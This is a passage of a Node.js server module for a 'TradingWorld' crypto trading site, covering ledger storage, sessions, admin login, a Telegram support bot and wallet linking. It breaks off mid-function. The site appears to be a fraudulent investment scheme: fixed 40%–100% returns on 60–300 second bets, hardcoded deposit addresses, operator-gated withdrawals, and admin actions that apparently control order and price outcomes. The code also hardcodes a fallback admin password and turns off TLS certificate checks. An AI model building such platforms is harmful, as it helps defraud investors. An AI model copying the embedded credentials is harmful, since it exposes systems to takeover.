import fs from 'node:fs';import path from 'node:path';import{randomBytes,randomInt,createHash,createHmac,scryptSync,timingSafeEqual}from'node:crypto';const root=process.env.DATA_DIR||process.cwd(),dir=path.join(root,'data'),files=[path.join(dir,'db.json'),path.join(dir,'db.bak.json'),path.join(root,'tw-ledger.json')];const addresses={BTC:'1CK2qFkXe8bEZiwqnAqxoWtGwPCqTPamUm',ETH:'0x51c2f8d0f06056574ff12c2db4a9d93b25e7760f',USDT:'TE3k8vs79GwftLT4VYi6FNQLWKkDzNRYLM',XRP:'rNxp4h8apvRis6mJf9Sh8C6iRxfrDWN7AV',TON:''};const blank=()=>({nextId:700101,issuedMax:700100,cfg:{addresses},users:[],deposits:[],withdrawals:[],orders:[],trades:[],audit:[],support:[],callbacks:[],recoveries:[]});function normalize(d){const b=blank();const users=(d.users||[]).map(u=>{if(!u.reg)u.reg={email:u.email,wallet:u.wallet||'',device:u.device||'',ip:u.ip||'',at:u.createdAt||Date.now()};const oldKyc=u.kyc&&typeof u.kyc==='object'?u.kyc.status:u.kyc;const balances=u.balances||{};return {...u,balance:Number(u.balance??balances.USDT??0),assets:{USDT:Number(u.assets?.USDT??balances.USDT??u.balance??0),BTC:Number(u.assets?.BTC??balances.BTC??0),ETH:Number(u.assets?.ETH??balances.ETH??0),XRP:Number(u.assets?.XRP??balances.XRP??0),TON:Number(u.assets?.TON??balances.TON??0)},settlement:'Market Dynamic',kyc:oldKyc==='approved'?'approved':oldKyc==='rejected'?'rejected':oldKyc==='pending'?'pending':(typeof oldKyc==='string'&&oldKyc!=='unverified'?oldKyc:'Not submitted'),twofa:Boolean(u.twofa??u.twoFA??false),device:u.device||u.lastAgent||'',ip:u.ip||u.lastIp||'',positions:u.positions||[],bots:u.bots||[]}});return {...b,...d,cfg:{...b.cfg,...(d.cfg||{}),addresses:{...addresses,...(d.cfg?.addresses||{})}},users,deposits:d.deposits||[],withdrawals:d.withdrawals||[],orders:d.orders||[],trades:d.trades||[],audit:d.audit||[],support:d.support||[],callbacks:d.callbacks||[],recoveries:d.recoveries||[]}}export function readFiles(){let best=null;for(const f of files){try{const d=normalize(JSON.parse(fs.readFileSync(f)));if(!best||d.users.length>best.users.length||(d.users.length===best.users.length&&d.issuedMax>best.issuedMax))best=d}catch{}}return best||blank()}
function writeFiles(d){try{fs.mkdirSync(dir,{recursive:true});for(const f of files)fs.writeFileSync(f,JSON.stringify(d,null,2))}catch(e){if(!PG)throw e}}

/* ============================================================
   Storage. With DATABASE_URL set (e.g. a free Neon Postgres) the
   ledger lives in the database and survives redeploys and restarts
   on hosts with an ephemeral filesystem. Without it, behaviour is
   unchanged: plain JSON files on disk.

   The rest of this file calls readDb()/writeDb() synchronously, so
   the database copy is mirrored in memory and flushed asynchronously.
   ============================================================ */
const PG_URL=String(process.env.DATABASE_URL||'').trim();
let PG=null,MEM=null,flushing=false,dirty=false;

async function pgFlush(){
  if(!PG||flushing)return;
  flushing=true;
  try{
    while(dirty){
      dirty=false;
      await PG.query('INSERT INTO tw_store(id,doc,updated_at) VALUES(1,$1,now()) ON CONFLICT(id) DO UPDATE SET doc=EXCLUDED.doc,updated_at=now()',[JSON.stringify(MEM)]);
    }
  }catch(e){dirty=true;console.error('[ledger] database write failed:',e.message)}
  finally{flushing=false}
}

async function pgConnect(){
  const{default:pg}=await import('pg');
  // Neon hands out a URL ending in channel_binding=require, which node-postgres
  // does not implement. Drop it rather than fail the connection.
  const url=PG_URL.replace(/[?&]channel_binding=[^&]*/,'');
  const pool=new pg.Pool({connectionString:url,ssl:{rejectUnauthorized:false},max:3,connectionTimeoutMillis:15000});
  await pool.query('CREATE TABLE IF NOT EXISTS tw_store(id int PRIMARY KEY, doc jsonb NOT NULL, updated_at timestamptz DEFAULT now())');
  const r=await pool.query('SELECT doc FROM tw_store WHERE id=1');
  PG=pool;
  if(r.rows.length){
    MEM=normalize(r.rows[0].doc);
    console.log(`[ledger] loaded from database: ${MEM.users.length} users`);
  }else{
    MEM=readFiles();                       // first run: adopt whatever is on disk
    dirty=true;await pgFlush();
    console.log(`[ledger] database initialised from local files: ${MEM.users.length} users`);
  }
}

if(PG_URL){
  try{
    await pgConnect();
  }catch(e){
    // A database problem must never take the whole site down: serve from files
    // and keep retrying quietly in the background.
    PG=null;
    console.error('[ledger] DATABASE_URL did not connect, running on local files instead:',e.message);
    let tries=0;
    const retry=setInterval(()=>{
      if(PG||++tries>60)return clearInterval(retry);
      pgConnect().then(()=>{clearInterval(retry);console.log('[ledger] database connected on retry')})
                 .catch(err=>console.error('[ledger] database retry failed:',err.message));
    },30000);
    retry.unref?.();
  }
  // last-gasp flush so an in-flight change is not lost on shutdown
  for(const sig of ['SIGTERM','SIGINT'])process.on(sig,()=>{dirty=true;pgFlush().finally(()=>process.exit(0))});
}

function readDb(){
  if(!PG)return readFiles();
  return structuredClone(MEM);
}
export function writeDb(d){
  d=normalize(d);
  if(PG){MEM=d;dirty=true;pgFlush();return d}
  writeFiles(d);return d;
}
function send(res,obj,status=200){if(res.statusCode!==undefined)res.statusCode=status;if(res.json)return res.json(obj);res.setHeader('Content-Type','application/json');return res.end(JSON.stringify(obj))}function route(app,m,p,fn){if(app[m])app[m](p,fn);else app.use((req,res,next)=>{if(req.method===m.toUpperCase()&&req.url.split('?')[0]===p)return fn(req,res,next);next()})}function maskTail(v){v=String(v||'');return v?(v.length<=4?'\u2022\u2022\u2022\u2022':'\u2022\u2022\u2022\u2022'+v.slice(-4)):''}function maskEmail(v){v=String(v||'');const i=v.indexOf('@');if(i<1)return v?'\u2022\u2022\u2022\u2022':'';return v[0]+'\u2022\u2022\u2022\u2022'+v.slice(i)}
/* ============================================================
   Web3 wallet linking.
   A wallet counts as linked only when the user signs a one-time
   challenge with it; the signature is verified here, so a client
   cannot claim an address it does not control. The link is stored
   on the user record, so it survives logout, redeploys and
   restarts exactly like the rest of the ledger.
   ============================================================ */
let ETH=null;
async function eth(){if(!ETH)ETH=await import('ethers');return ETH}

const TRON_PREFIX='\x19TRON Signed Message:\n';

// TRON addresses are the same secp256k1 key as EVM, re-encoded: 0x41 + last
// 20 bytes of keccak(pubkey), then base58check.
async function evmToTron(evmAddr){
  const e=await eth();
  const body=e.getBytes('0x41'+evmAddr.slice(2));
  const check=e.getBytes(e.sha256(e.sha256(body))).slice(0,4);
  return e.encodeBase58(e.concat([body,check]));
}

async function recoverWallet(chain,message,signature){
  const e=await eth();
  if(chain==='tron'){
    const msg=e.toUtf8Bytes(message);
    const digest=e.keccak256(e.concat([e.toUtf8Bytes(TRON_PREFIX+msg.length),msg]));
    return evmToTron(e.recoverAddress(digest,signature));
  }
  return e.verifyMessage(message,signature);            // EVM personal_sign
}

const sameAddr=(a,b)=>String(a||'').toLowerCase()===String(b||'').toLowerCase();

function safeUser(u){const{password,telegramChatId,telegramPending,walletPending,reg,kycId,kycName,kycCountry,wallet,...x}=u;return {...x,telegramLinked:!!telegramChatId,telegramUsername:u.telegramUsername||'',hasWallet:!!(reg&&reg.wallet),hasKyc:!!(u.kycName&&u.kycId),reg:reg?{emailMask:maskEmail(reg.email),walletMask:maskTail(reg.wallet),device:reg.device||'',ip:reg.ip||'',at:reg.at||u.createdAt}:null}}function user(d,id){return d.users.find(u=>String(u.id)===String(id))}function audit(d,action,uid,meta={}){d.audit.unshift({id:Date.now(),action,uid,...meta,at:Date.now()});d.audit=d.audit.slice(0,500)}const BOT_RULES=[

[['deposit','txid','fund'],'Deposits: open Wallet \u2192 Deposit, pick the asset, send the amount to the displayed address, then submit the transaction ID (minimum 8 characters). Every deposit is verified by the System \u2014 approved funds are credited to your balance right away.'],
[['withdraw','withdrawal','payout'],'Withdrawals: open Wallet \u2192 Withdraw, enter the amount and destination address. If 2FA is enabled you will also need your 8-digit code. Requests are reviewed by an operator \u2014 approved payouts are marked as paid, rejected requests are refunded in full.'],
[['kyc','identity'],'KYC: open the KYC page from the menu, enter your full legal name, country and ID number, then submit. Status moves to pending and an operator reviews it. The result (approved / rejected) appears on the same page and is stored permanently.'],
[['pending','activate','activation','administrative'],'New accounts start as Pending System Verification. Once the System activates your UID, trading, deposits and withdrawals unlock automatically. Your balance and data are tracked the whole time.'],
[['closed','weekend','saturday','sunday','hours','market open'],'Market hours: crypto markets run 24/7. Stocks (AAPL, TSLA, GOOGL, NVDA) and gold (XAU) run Mon\u2013Fri \u2014 outside sessions they show Market Closed and trading is disabled until the next session.'],
[['duration','settle','yield','plan','60s','120s','180s','300s'],'Durations and yield plans: 60s \u2192 40%, 120s \u2192 60%, 180s \u2192 80%, 300s \u2192 100% on the staked amount. Settlement follows your account settlement mode \u2014 Market Dynamic uses real market movement. Outcomes are never guaranteed.'],
[['password','log in','login','access'],'Account access: log in with your registered email and password. Your UID is permanent and bound to your email forever. If a session drops, just log in again \u2014 balance, orders and history stay attached to your UID.'],
[['fee','charge','cost'],'TradingWorld does not charge deposit fees. Trading uses the published plan rates (40%\u2013100% by duration); settlement credits or debits the staked amount accordingly.'],
[['guarantee','guaranteed','sure profit'],'No one can guarantee profits. Market Dynamic settlement follows real price movement, so results depend on the market. Only trade what you can afford to lose.'],
[['operator','human','agent','call','phone','speak'],'You can reach the support team directly: type your question here and an operator will answer in this chat, or use Request a callback on this page \u2014 the request lands in the operator console and we call you back.'],
[['order','position','buy','sell','trade'],'To trade: open Terminal, pick a market, enter the amount, choose a duration (60/120/180/300s) and a side (Up/Down). The order settles automatically when the countdown ends and lands in your trade history with a receipt.'],
[['hello','hi ','hey','help','start'],"Hello! I am the TradingWorld Support Assistant, online 24/7. Ask me about deposits, withdrawals, KYC, trading or market hours \u2014 or type \"operator\" to reach the support team."]];
function botReply(t){const s=' '+String(t||'').toLowerCase()+' ';for(const[ws,a]of BOT_RULES){if(ws.some(w=>s.includes(w)))return a}return 'Thanks for your message \u2014 I have logged it for the support team. An operator will review this conversation and reply here. For anything urgent, request a callback from this page.'}
const TG_API_BASE=(process.env.TELEGRAM_API_BASE||'https://api.telegram.org').replace(/\/$/,'');
const TG_TOKEN=process.env.TELEGRAM_BOT_TOKEN||'',TG_USER=(process.env.TELEGRAM_BOT_USERNAME||'').replace(/^@/,''),PUBLIC_URL=(process.env.PUBLIC_URL||'').replace(/\/$/,'');
const otpHash=(uid,code)=>createHash('sha256').update(String(uid)+':'+String(code)+':'+(process.env.OTP_SECRET||'tradingworld-recovery')).digest('hex');
async function tgCall(method,payload){if(!TG_TOKEN)return{ok:false,description:'Telegram bot is not configured'};try{const r=await fetch(`${TG_API_BASE}/bot${TG_TOKEN}/${method}`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});return await r.json()}catch{return{ok:false,description:'Telegram unavailable'}}}
async function sendTg(chatId,text){return tgCall('sendMessage',{chat_id:chatId,text,disable_web_page_preview:true})}
async function ensureWebhook(){if(TG_TOKEN&&PUBLIC_URL)await tgCall('setWebhook',{url:PUBLIC_URL+'/api/telegram/webhook',secret_token:process.env.TELEGRAM_WEBHOOK_SECRET||undefined})}

/* ============ password hashing (scrypt) ============ */
function hashPw(pw){const salt=randomBytes(16);const h=scryptSync(String(pw),salt,64);return 'scrypt$'+salt.toString('hex')+'$'+h.toString('hex')}
function verifyPw(pw,stored){
  if(!stored)return false;const st=String(stored);
  if(!st.startsWith('scrypt$')){const a=Buffer.from(String(pw)),b=Buffer.from(st);return a.length===b.length&&timingSafeEqual(a,b)}
  const parts=st.split('$');if(parts.length!==3)return false;
  try{const calc=scryptSync(String(pw),Buffer.from(parts[1],'hex'),64);const hb=Buffer.from(parts[2],'hex');
    return hb.length===calc.length&&timingSafeEqual(hb,calc)}catch{return false}}
function isLegacyPw(stored){return !!stored&&!String(stored).startsWith('scrypt$')}

/* ============ TOTP (RFC 6238) for the operator console ============ */
function b32dec(str){const A='ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';let bits=0,val=0;const out=[];
  for(const c of String(str).toUpperCase().replace(/[^A-Z2-7]/g,'')){const i=A.indexOf(c);if(i<0)continue;
    val=(val<<5)|i;bits+=5;if(bits>=8){out.push((val>>>(bits-8))&255);bits-=8}}
  return Buffer.from(out)}
function totpAt(secret,step){const key=b32dec(secret);if(!key.length)return '';
  const buf=Buffer.alloc(8);buf.writeUInt32BE(Math.floor(step/4294967296),0);buf.writeUInt32BE(step>>>0,4);
  const h=createHmac('sha1',key).update(buf).digest();const o=h[h.length-1]&15;
  const n=((h[o]&127)<<24)|((h[o+1]&255)<<16)|((h[o+2]&255)<<8)|(h[o+3]&255);
  return String(n%1000000).padStart(6,'0')}
function totpOk(secret,code){const c=String(code||'').replace(/\D/g,'');if(c.length!==6)return false;
  const step=Math.floor(Date.now()/30000);
  for(let w=-1;w<=1;w++){const exp=totpAt(secret,step+w);if(exp&&exp.length===6){
    const a=Buffer.from(exp),b=Buffer.from(c);if(a.length===b.length&&timingSafeEqual(a,b))return true}}
  return false}
const ADMIN_TOTP_SECRET=String(process.env.ADMIN_TOTP_SECRET||'').trim();
const ADMIN_PASSWORD_HASH=String(process.env.ADMIN_PASSWORD_HASH||'').trim();

const ADMIN_EMAIL=(process.env.ADMIN_EMAIL||'mglwanwai19900@gmail.com').toLowerCase();const ADMIN_PASSWORD=process.env.ADMIN_PASSWORD||'Aa369369@@';function adminPwOk(pw){return ADMIN_PASSWORD_HASH?verifyPw(pw,ADMIN_PASSWORD_HASH):verifyPw(pw,ADMIN_PASSWORD)}
function isAdmin(b){return String(b.adminEmail||'').trim().toLowerCase()===ADMIN_EMAIL&&adminPwOk(String(b.adminPassword||''))}function nrm(v){return String(v==null?'':v).trim().toLowerCase()}

/* ============ sessions, prices, guards ============ */
const SESSIONS=new Map();      // token -> {uid,exp}
const ADMIN_SESSIONS=new Map(); // token -> {exp}
const SESSION_TTL=12*60*60*1000;
const LOGIN_HITS=new Map();     // key -> {n,until}
function newToken(){return randomBytes(32).toString('base64url')}
function sweep(){const t=Date.now();for(const[k,v]of SESSIONS)if(v.exp<t)SESSIONS.delete(k);for(const[k,v]of ADMIN_SESSIONS)if(v.exp<t)ADMIN_SESSIONS.delete(k);for(const[k,v]of LOGIN_HITS)if(v.until<t)LOGIN_HITS.delete(k)}
setInterval(sweep,60*1000).unref?.();
function issueUser(uid){const t=newToken();SESSIONS.set(t,{uid:String(uid),exp:Date.now()+SESSION_TTL});return t}
function issueAdmin(){const t=newToken();ADMIN_SESSIONS.set(t,{exp:Date.now()+SESSION_TTL});return t}
function tokenOf(b,req){return String(b.token||req?.headers?.['x-tw-token']||'')}
function adminTokenOf(b,req){return String(b.adminToken||req?.headers?.['x-tw-admin']||'')}
function sessionUid(b,req){const s=SESSIONS.get(tokenOf(b,req));return s&&s.exp>Date.now()?s.uid:null}
function isAdminReq(b,req){const t=adminTokenOf(b,req);const s=ADMIN_SESSIONS.get(t);if(s&&s.exp>Date.now())return true;return isAdmin(b)}
function throttle(key,max,windowMs){const t=Date.now();const h=LOGIN_HITS.get(key);if(h&&h.until>t){h.n++;return h.n>max}LOGIN_HITS.set(key,{n:1,until:t+windowMs});return false}
function clientIp(req){return String(req?.headers?.['x-forwarded-for']||'').split(',')[0].trim()||String(req?.socket?.remoteAddress||'')}

const ADMIN_ONLY=new Set(['approveTx','rejectTx','saveCfg','setPxTier','setOrderTier','recoverRelease','recoverCancel','supportReply','supportMarkRead','callbackUpdate','import','adminUserDetail','adminExport']);
const PUBLIC_ACTIONS=new Set(['register','login','adminLogin','adminLogout','adminAuthMode','recoverStart','recoverStatus','verifyRecovery']);
const USER_FIELDS=new Set(['displayName','timezone','emailAlerts','settingsSavedAt','kycName','kycCountry','kycId']);

/* server-side price cache so balances can never be moved at a client-supplied rate */
const PRICE_FALLBACK={BTC:67240.2,ETH:3512.48,SOL:176.21,XRP:0.53,BNB:602.4,TON:7.2,ADA:.44,DOT:6.8,AVAX:36.5,LINK:14.4,POL:.52,ATOM:7.9,NEAR:5.1,UNI:9.8,LTC:78.4,BCH:412.5,APT:8.2,SUI:1.65,PEPE:.0000112,SHIB:.0000245,DOGE:.142,FIL:4.8,ARB:.92,OP:2.1,INJ:22.4,FET:1.35,RENDER:7.4,TAO:412,WLD:2.3,SEI:.48,TIA:5.9,AAPL:214.3,TSLA:248.5,GOOGL:176.2,NVDA:124.6,XAU:2385.4,USDT:1};
const PRICES=new Map();let PRICES_AT=0;
async function refreshPrices(){try{const r=await fetch('https://data-api.binance.vision/api/v3/ticker/price');if(!r.ok)return;const rows=await r.json();
  for(const row of rows){if(!String(row.symbol).endsWith('USDT'))continue;const sym=String(row.symbol).slice(0,-4);const p=Number(row.price);if(p>0)PRICES.set(sym,p)}
  PRICES.set('USDT',1);PRICES_AT=Date.now()}catch{}}
refreshPrices();setInterval(refreshPrices,15000).unref?.();
function serverPrice(sym){sym=String(sym||'').toUpperCase();if(sym==='USDT')return 1;
  const live=PRICES.get(sym);if(live>0&&Date.now()-PRICES_AT<5*60*1000)return live;
  return PRICE_FALLBACK[sym]>0?PRICE_FALLBACK[sym]:0}

function recoveryFor(d,uid){return(d.recoveries||[]).find(x=>String(x.uid)===String(uid)&&!x.usedAt&&x.expiresAt>Date.now())}

export function attachLedger(app){
route(app,'post','/api/telegram/webhook',async(req,res)=>{
if(process.env.TELEGRAM_WEBHOOK_SECRET&&req.headers?.['x-telegram-bot-api-secret-token']!==process.env.TELEGRAM_WEBHOOK_SECRET)return send(res,{ok:false},403);
let b=req.body||{};if(!Object.keys(b).length){let z='';for await(const c of req)z+=c;try{b=JSON.parse(z)}catch{}}
const msg=b.message||b.edited_message;const chatId=msg?.chat?.id!=null?String(msg.chat.id):'';
const text=String(msg?.text||msg?.caption||'').trim();
if(!chatId)return send(res,{ok:true});
const now=Date.now();const d=readDb();
const nameOf=f=>f?.username||[f?.first_name,f?.last_name].filter(Boolean).join(' ')||'';

/* 1. linking: /start tw_<token> */
const m=text.match(/^\/start\s+tw_([A-Za-z0-9_-]+)/);
if(m){const u=d.users.find(x=>x.telegramPending?.token===m[1]&&x.telegramPending.expiresAt>now);
  if(u){u.telegramChatId=chatId;u.telegramUsername=nameOf(msg.from);u.telegramLinkedAt=now;delete u.telegramPending;
    audit(d,'telegramLinked',u.id,{username:u.telegramUsername});writeDb(d);
    await sendTg(chatId,`TradingWorld connected successfully. UID ${u.id}.\n\nYou can now receive account-recovery codes here, and message this chat any time to reach customer support. Type /help for the options.`)}
  else{await sendTg(chatId,'That connection link has expired. Open TradingWorld, go to Support and tap "Connect Telegram" to get a fresh link.')}
  return send(res,{ok:true})}

const u=d.users.find(x=>String(x.telegramChatId)===chatId);

/* 2. not linked yet */
if(!u){await sendTg(chatId,'This chat is not linked to a TradingWorld account yet.\n\nSign in at TradingWorld, open Support and tap "Connect Telegram" to link it, then you can chat with our team right here.');return send(res,{ok:true})}

/* 3. commands */
if(/^\/start\b/.test(text)){await sendTg(chatId,`Welcome back, UID ${u.id}. Send a message here and our support team will answer. Type /help for the options.`);return send(res,{ok:true})}
if(/^\/help\b/.test(text)){await sendTg(chatId,`TradingWorld support commands\n\n/status  your account summary\n/help    this message\n\nAnything else you type is delivered straight to our support team, and their replies arrive in this chat.`);return send(res,{ok:true})}
if(/^\/status\b/.test(text)){
  const open=(d.orders||[]).filter(x=>String(x.uid)===String(u.id)&&x.status==='open').length;
  await sendTg(chatId,`UID ${u.id}\nStatus: ${u.status}\nKYC: ${u.kyc||'Not submitted'}\nBalance: $${Number(u.balance||0).toFixed(2)}\nOpen orders: ${open}`);
  return send(res,{ok:true})}

/* 4. anything else becomes a support ticket in the operator console */
if(!text){await sendTg(chatId,'Only text messages can be forwarded to support at the moment. Please describe the issue in a message.');return send(res,{ok:true})}
d.support=d.support||[];
d.support.push({id:'sup_'+now+'_t'+Math.floor(Math.random()*1e4),uid:u.id,from:'user',source:'telegram',text:text.slice(0,1000),at:now,readByUser:true,readByAdmin:false});
const auto=botReply(text);
d.support.push({id:'sup_'+now+'_tb',uid:u.id,from:'bot',source:'telegram',text:auto,at:now+1,readByUser:true,readByAdmin:true});
u.lastSeenAt=now;audit(d,'supportSend',u.id,{via:'telegram'});writeDb(d);
await sendTg(chatId,auto+'\n\nA human agent will follow up here if this does not resolve it.');
send(res,{ok:true})});

route(app,'get','/api/store',(req,res)=>{const d=readDb();const b={};const tgCfg={telegramBot:TG_USER,telegramEnabled:!!(TG_TOKEN&&TG_USER)};
if(isAdminReq(b,req))return send(res,{nextId:d.nextId,issuedMax:d.issuedMax,cfg:{...d.cfg,...tgCfg},users:d.users.map(safeUser),deposits:d.deposits,withdrawals:d.withdrawals,orders:d.orders,trades:d.trades,audit:d.audit,support:d.support,callbacks:d.callbacks,recoveries:(d.recoveries||[]).map(({codeHash,code,...x})=>x)});const uid=sessionUid(b,req);if(!uid)return send(res,{cfg:{addresses:d.cfg?.addresses||{},...tgCfg},users:[],deposits:[],withdrawals:[],orders:[],trades:[],audit:[],support:[],callbacks:[],recoveries:[]});const mine=a=>(a||[]).filter(x=>String(x.uid)===String(uid));const u=user(d,uid);send(res,{cfg:{addresses:d.cfg?.addresses||{},...tgCfg},user:u?safeUser(u):null,users:u?[safeUser(u)]:[],deposits:mine(d.deposits),withdrawals:mine(d.withdrawals),orders:mine(d.orders),trades:mine(d.trades),support:mine(d.support),callbacks:mine(d.callbacks),audit:[],recoveries:[]})});route(app,'post','/api/store',async(req,res)=>{let b=req.body||{};if(!Object.keys(b).length){let s='';for await(const c of req)s+=c;try{b=JSON.parse(s)}catch{}}const d=readDb(),now=Date.now();let out={ok:true};
const act=String(b.action||'');const ip=clientIp(req);
if(ADMIN_ONLY.has(act)&&!isAdminReq(b,req))return send(res,{error:'Admin authentication required'},403);
if(!PUBLIC_ACTIONS.has(act)&&!ADMIN_ONLY.has(act)){
  const su=sessionUid(b,req);const adm=isAdminReq(b,req);
  if(!su&&!adm)return send(res,{error:'Sign in required'},401);
  if(su&&!adm){b.uid=su;b.id=su;if(b.user&&typeof b.user==='object')b.user={...b.user,id:su};
    if(act==='saveUser'){const cur=user(d,su)||{};const clean={id:su};for(const k of Object.keys(b.user||{}))if(USER_FIELDS.has(k))clean[k]=b.user[k];
      if(b.user&&b.user.kyc==='pending')clean.kyc='pending';b.user=clean}
    if(act==='closeOrder'){const o=(d.orders||[]).find(x=>x.id===b.orderId);if(!o||String(o.uid)!==String(su))return send(res,{error:'Order not found'},404)}
    if(act==='updateKyc'&&b.status!=='pending')return send(res,{error:'Admin authentication required'},403);
    if(act==='requestRecovery')b.requestedBy='user';
  }
}
if(b.action==='adminLogin'){if(throttle('al:'+ip,5,15*60*1000)){audit(d,'adminLoginThrottled',null,{ip});writeDb(d);return send(res,{error:'Too many attempts. Try again later.'},429)}
  if(!isAdmin({adminEmail:b.email,adminPassword:b.password})){audit(d,'adminLoginFailed',null,{ip});writeDb(d);return send(res,{error:'Access denied'},401)}
  if(ADMIN_TOTP_SECRET){if(!String(b.code||'').trim()){audit(d,'adminLogin2faMissing',null,{ip});writeDb(d);return send(res,{error:'Authenticator code required',need2fa:true},401)}
    if(!totpOk(ADMIN_TOTP_SECRET,b.code)){audit(d,'adminLogin2faFailed',null,{ip});writeDb(d);return send(res,{error:'Invalid authenticator code',need2fa:true},401)}}
  const t=issueAdmin();audit(d,'adminLogin',null,{ip});writeDb(d);return send(res,{ok:true,adminToken:t})}
if(b.action==='adminAuthMode')return send(res,{ok:true,need2fa:!!ADMIN_TOTP_SECRET});
if(b.action==='adminLogout'){ADMIN_SESSIONS.delete(adminTokenOf(b,req));return send(res,{ok:true})}
if(b.action==='register'){if(d.users.some(u=>u.email.toLowerCase()===String(b.email).toLowerCase()))return send(res,{error:'Account already exists'},409);const u={id:d.nextId++,email:b.email,password:hashPw(b.password),status:'pending',createdAt:now,lastSeenAt:now,device:b.device||'',ip:b.ip||String(req.headers['x-forwarded-for']||'').split(',')[0].trim()||String(req.socket?.remoteAddress||''),wallet:b.wallet||'',balance:0,assets:{USDT:0,BTC:0,ETH:0,XRP:0,TON:0},settlement:'Market Dynamic',kyc:'Not submitted',twofa:false,trades:[],positions:[]};u.reg={email:u.email,wallet:u.wallet||'',device:u.device||'',ip:u.ip||'',at:now};d.issuedMax=Math.max(d.issuedMax,u.id);d.users.push(u);audit(d,'register',u.id);out.user=safeUser(u);out.token=issueUser(u.id)}else if(b.action==='login'){if(throttle('lg:'+ip,10,15*60*1000))return send(res,{error:'Too many sign-in attempts. Try again later.'},429);const u=d.users.find(x=>String(x.email||'').toLowerCase()===String(b.email||'').toLowerCase());if(!u||!verifyPw(b.password,u.password)){audit(d,'loginFailed',null,{ip});writeDb(d);return send(res,{error:'Invalid email or password'},401)}if(isLegacyPw(u.password)){u.password=hashPw(b.password);audit(d,'passwordRehashed',u.id)}u.lastSeenAt=now;audit(d,'login',u.id);out.user=safeUser(u);out.token=issueUser(u.id)}else if(b.action==='heartbeat'){const u=user(d,b.id);if(u)u.lastSeenAt=now}else if(b.action==='logout'){const u=user(d,b.id);if(u)u.lastSeenAt=0;SESSIONS.delete(tokenOf(b,req))}else if(b.action==='saveUser'){const u=user(d,b.user?.id);if(!u)return send(res,{error:'User not found'},404);const{id,email,password,reg,pxTier,telegramChatId,telegramPending,web3,walletPending,...patch}=b.user||{};Object.assign(u,patch);audit(d,'saveUser',u.id,{by:isAdminReq(b,req)?'admin':'user'})}else if(b.action==='saveCfg'){d.cfg={...d.cfg,...b.cfg,addresses:{...d.cfg.addresses,...(b.cfg?.addresses||{})}};audit(d,'saveCfg')}else if(b.action==='updateKyc'){const u=user(d,b.uid);if(!u)return send(res,{error:'User not found'},404);const st=String(b.status||'');if((st==='approved'||st==='rejected')&&!isAdminReq(b,req))return send(res,{error:'Admin authentication required'},403);const note=String(b.note||'').slice(0,300);u.kyc=st;u.kycNote=note;if(st==='pending'){u.kycSubmittedAt=now;u.kycReviewedAt=null}else{u.kycReviewedAt=now}u.kycHistory=(u.kycHistory||[]);u.kycHistory.unshift({at:now,status:st,note,by:st==='pending'?'user':'admin'});u.kycHistory=u.kycHistory.slice(0,20);audit(d,'updateKyc',u.id,{status:st,note})}else if(b.action==='update2fa'){const u=user(d,b.uid);if(u){u.twofa=!!b.enabled;audit(d,'update2fa',u.id,{enabled:u.twofa})}}
else if(b.action==='telegramCreateLink'){const u=user(d,b.uid);if(!u)return send(res,{error:'User not found'},404);if(!TG_TOKEN||!TG_USER)return send(res,{error:'Telegram bot is not configured. Set TELEGRAM_BOT_TOKEN and TELEGRAM_BOT_USERNAME on Render.'},503);const token=randomBytes(24).toString('base64url');u.telegramPending={token,expiresAt:now+15*60*1000};audit(d,'telegramLinkRequested',u.id);out.deepLink=`https://t.me/${TG_USER}?start=tw_${token}`;out.expiresAt=u.telegramPending.expiresAt;ensureWebhook()}
else if(b.action==='walletChallenge'){
  const u=user(d,b.uid);if(!u)return send(res,{error:'User not found'},404);
  const chain=b.chain==='tron'?'tron':'evm';
  const nonce=randomBytes(16).toString('hex');
  const message=`TradingWorld wallet verification\n\nAccount UID: ${u.id}\nChain: ${chain==='tron'?'TRON':'EVM'}\nNonce: ${nonce}\n\nSigning this message proves you control this wallet.\nIt costs no gas and authorises no transaction.`;
  u.walletPending={message,chain,expiresAt:now+10*60*1000};
  audit(d,'walletChallenge',u.id,{chain});
  out.message=message;out.expiresAt=u.walletPending.expiresAt}

else if(b.action==='walletConnect'){
  const u=user(d,b.uid);if(!u)return send(res,{error:'User not found'},404);
  const p=u.walletPending;
  delete u.walletPending;            // single use: a nonce is never replayable
  if(!p||p.expiresAt<now){writeDb(d);return send(res,{error:'Verification expired. Please try connecting again.'},400)}
  const addr=String(b.address||'').trim();
  if(!addr||!b.signature)return send(res,{error:'Wallet address and signature are required'},400);
  let recovered;
  try{recovered=await recoverWallet(p.chain,p.message,String(b.signature))}
  catch(e){audit(d,'walletConnectFailed',u.id,{reason:'bad signature'});writeDb(d);return send(res,{error:'That signature could not be verified'},400)}
  if(!sameAddr(recovered,addr)){
    audit(d,'walletConnectFailed',u.id,{reason:'address mismatch'});writeDb(d);
    return send(res,{error:'The signature does not match the wallet address'},400)}
  const taken=d.users.find(x=>String(x.id)!==String(u.id)&&x.web3&&sameAddr(x.web3.address,recovered));
  if(taken){audit(d,'walletConnectFailed',u.id,{reason:'already linked elsewhere'});writeDb(d);
    return send(res,{error:'This wallet is already linked to another account'},409)}
  delete u.walletPending;
  u.web3={chain:p.chain,address:recovered,connectedAt:now};
  audit(d,'walletConnected',u.id,{chain:p.chain,address:recovered});
  out.web3=u.web3}

else if(b.action==='walletDisconnect'){
  const u=user(d,b.uid);if(!u)return send(res,{error:'User not found'},404);
  const had=u.web3?.address||'';
  delete u.web3;delete u.walletPending;
  audit(d,'walletDisconnected',u.id,{address:had});
  out.ok=true}

else if(b.action==='telegramDisconnect'){const u=user(d,b.uid);if(!u)return send(res,{error:'User not found'},404);delete u.telegramChatId;delete u.telegramUsername;delete u.telegramLinkedAt;delete u.telegramPending;audit(d,'telegramDisconnected',u.id)}
else if(b.action==='requestRecovery'){const ident=String(b.identifier||b.uid||'').trim().toLowerCase();const u=d.users.find(x=>String(x.id)===ident||String(x.email||'').toLowerCase()===ident);if(!u||!u.telegramChatId){out.message='If this account is linked to Telegram, a recovery code will arrive shortly.';audit(d,'recoveryUnavailable',u?.id||null);}
